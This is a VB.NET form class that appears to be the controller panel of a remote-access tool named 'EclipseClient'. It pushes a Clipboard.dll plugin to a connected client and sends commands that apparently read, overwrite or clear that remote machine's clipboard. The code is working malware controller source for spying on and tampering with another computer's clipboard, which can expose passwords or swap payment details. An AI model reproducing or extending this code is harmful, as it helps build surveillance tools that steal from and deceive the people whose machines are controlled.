Imports System.IO

Public Class CB
    Public C As Client
    Private Sub CB_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Dim B As Byte() = SB("R$" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipboard.dll")))
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub REToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles REToolStripMenuItem.Click
        Try
            Dim B As Byte() = SB("R$" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipboard.dll")))
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub KillProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillProcessToolStripMenuItem.Click
        Try
            Dim B As Byte() = SB("SETT" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipboard.dll")) & Settings.SPL & RichTextBox1.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub ClearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
        Try
            Dim B As Byte() = SB("clss" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipboard.dll")))
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            RichTextBox1.Clear()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Try
            Clipboard.SetText(RichTextBox1.SelectedText)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RichTextBox1_LinkClicked(sender As Object, e As LinkClickedEventArgs) Handles RichTextBox1.LinkClicked
        Try
            Process.Start(e.LinkText)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox1.Click
        Me.Close()
    End Sub

    Private Sub Guna2ControlBox2_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox2.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub RichTextBox1_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox1.TextChanged

    End Sub

    Private Sub guna2Panel1_Paint(sender As Object, e As PaintEventArgs) Handles guna2Panel1.Paint

    End Sub
End Class